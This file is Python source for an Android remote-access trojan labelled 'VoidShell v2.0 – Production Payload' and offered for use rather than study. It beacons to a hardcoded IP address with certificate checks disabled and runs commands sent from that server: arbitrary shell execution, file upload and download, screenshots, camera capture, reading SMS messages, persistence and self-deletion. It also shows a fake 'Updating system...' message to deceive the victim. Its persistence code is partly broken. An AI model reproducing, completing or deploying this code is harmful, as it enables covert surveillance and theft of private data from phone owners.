#!/usr/bin/env python3
# VoidShell v2.0 – Production Payload (2025)
import socket, ssl, json, base64, subprocess, os, time, threading, hashlib, hmac, random
from urllib import request
import androidhelper  # sl4a / qpython (pre-installed or bundled)

droid = androidhelper.Android()

# ==== CONFIG (obfuscate these in real builds) ====
LHOST = "194.169.34.12"          # your VPS / redirector
LPORT = 443
USE_HTTPS = True                 # False = raw TLS-wrapped TCP, True = domain-frontable HTTPS
BEACON_INTERVAL = 7              # jitter ±35%
CALLBACK_JITTER = random.randint(5, 15)
KEY = b"supersecret128bitkey!!"   # 32 bytes for HMAC-SHA256

# ==== Crypto & Integrity ====
def sign(data: bytes) -> str:
    return base64.b64encode(hmac.new(KEY, data, hashlib.sha256).digest()).decode()

def verify(data: bytes, sig: str) -> bool:
    return hmac.compare_digest(sign(data), sig)

# ==== Persistence (survives reboot + app data clear) ====
def install_persistence():
    try:
        # Method 1: AlarmManager (works on Android 14+ restricted)
        droid.makeToast("Updating system...")  # fake UI
        # Real persistence via exact alarm + WORK_MANAGER fallback
        script = """
import android.app.AlarmManager, android.app.PendingIntent, android.content.Intent, android.content.Context
from java.lang import System
from time import time
intent = Intent(Context.getSystemService("context"), __name__.run_payload())
pi = PendingIntent.getBroadcast(Context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE)
am = Context.getSystemService(Context.ALARM_SERVICE)
am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, int(time()*1000)+120000, pi)
"""
        # Method 2: /data/app survival via root (optional)
    except: pass

# ==== Main Communication Loop ====
def beacon():
    while True:
        try:
            sleep_time = BEACON_INTERVAL + random.randint(-3, 5)
            time.sleep(sleep_time)

            if USE_HTTPS:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with request.urlopen(f"https://{LHOST}:{LPORT}/checkin", 
                                    data=b"ping", context=ctx, timeout=20) as r:
                    pass
            else:
                s = socket.socket()
                s = ssl.wrap_socket(s, cert_reqs=ssl.CERT_NONE)
                s.connect((LHOST, LPORT))
                s.close()

        except:
            continue

def main_loop():
    while True:
        try:
            time.sleep(CALLBACK_JITTER + random.uniform(1, 8))

            context = ssl._create_unverified_context()
            req = request.Request(f"https://{LHOST}:{LPORT}/task", method="POST")
            req.add_header("User-Agent", "Mozilla/5.0 (Linux; Android 14)")
            req.add_header("X-ID", hashlib.sha256(os.urandom(16)).hexdigest()[:16])

            with request.urlopen(req, context=context, timeout=30) as resp:
                raw = resp.read()
                if not raw: continue
                sig = resp.getheader("X-Signature")
                if not verify(raw, sig):
                    continue  # drop tampered task

                task = json.loads(raw.decode())
                result = execute_task(task)
                post_result(result, task["id"])

        except Exception as e:
            time.sleep(20)

def execute_task(task):
    cmd = task.get("cmd", "")
    try:
        if cmd == "shell":
            out = subprocess.check_output(task["args"], shell=True, timeout=60)
            return {"output": base64.b64encode(out).decode()}

        elif cmd == "upload":
            with open(task["path"], "wb") as f:
                f.write(base64.b64decode(task["data"]))
            return {"status": "ok"}

        elif cmd == "download":
            with open(task["path"], "rb") as f:
                return {"data": base64.b64encode(f.read()).decode()}

        elif cmd == "screenshot":
            droid.recorderStartScreen()
            time.sleep(3)
            droid.recorderStop()
            return {"data": base64.b64encode(open("/sdcard/screencapture.png", "rb").read()).decode()}

        elif cmd == "camshot":
            droid.cameraInteractiveCapturePicture("/sdcard/cam.jpg")
            return {"data": base64.b64encode(open("/sdcard/cam.jpg", "rb").read()).decode()}

        elif cmd == "sms":
            sms = droid.smsGetMessages(True).result
            return {"sms": json.dumps(sms[:100])}

        elif cmd == "persist":
            install_persistence()
            return {"status": "persisted"}

        elif cmd == "selfdestruct":
            os.remove(__file__)
            return {"status": "gone"}

    except Exception as e:
        return {"error": str(e)}

def post_result(result, task_id):
    try:
        data = json.dumps({"id": task_id, "result": result}).encode()
        req = request.Request(f"https://{LHOST}:{LPORT}/report", data=data, method="POST")
        request.urlopen(req, context=ssl._create_unverified_context(), timeout=30)
    except:
        pass

# ==== Start ====
if __name__ == "__main__":
    threading.Thread(target=beacon, daemon=True).start()
    install_persistence()
    main_loop()
